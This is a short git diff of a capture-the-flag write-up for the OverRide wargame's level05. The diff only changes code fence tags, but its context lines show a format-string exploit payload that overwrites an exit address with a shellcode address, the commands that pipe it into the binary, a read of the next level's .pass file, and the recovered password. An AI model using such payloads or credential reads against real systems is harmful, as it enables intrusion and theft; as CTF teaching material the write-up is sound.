@@ -203,7 +203,7 @@ shell_lsb = shell_addr & 0xffff
 print exit_addr  + "%" + str(shell_lsb - 8) + "d%10$hn" + "%" + str(shell_msb - shell_lsb) + "d%11$hn"
 ```
 
-```
+```py
 level05@OverRide:~$ python /tmp/pyload.py > /tmp/pyload
 
 level05@OverRide:~$ (cat /tmp/pyload; cat) | ./level05 > /dev/null
@@ -213,7 +213,7 @@ cat /home/users/level06/.pass 1>&2
 h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
 ```
 
-```
+```py
 import struct
 
 shell_addr = 0xffffddb4
